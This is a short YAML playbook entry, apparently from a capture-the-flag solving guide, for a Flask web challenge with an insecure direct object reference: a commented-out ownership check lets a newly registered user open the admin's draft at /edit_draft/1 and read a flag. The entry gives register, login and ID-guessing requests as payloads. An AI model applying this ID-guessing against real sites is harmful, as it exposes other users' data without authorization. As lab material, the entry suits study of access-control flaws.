name: flask_idor_draft_edit
category: web
tags: [idor, authorization, flask, draft]
indicators:
  - "Edit draft endpoint with ID"
  - "Commented out authorization check"
  - "No verification of draft ownership"
  - "Admin draft contains flag"

tricks:
  - name: "Step 1: Identify IDOR"
    when: "Found edit endpoint with ID"
    how: "Check if authorization is validated"
    payload: |
      # edit_draft/<int:draft_id>
      # Check if author verification is commented out

  - name: "Step 2: Register and login"
    when: "Need authenticated session"
    how: "Create account and login"
    payload: |
      POST /register
      username=attacker&password=attacker123
      
      POST /login
      username=attacker&password=attacker123

  - name: "Step 3: Access admin draft"
    when: "Logged in as regular user"
    how: "Access admin's draft by ID"
    payload: |
      GET /edit_draft/1
      # Admin's draft is usually id=1

  - name: "Step 4: Extract flag"
    when: "Draft accessed"
    how: "Read flag from draft content"
    payload: |
      # Flag is in draft content
      # May need to view or edit to see full content

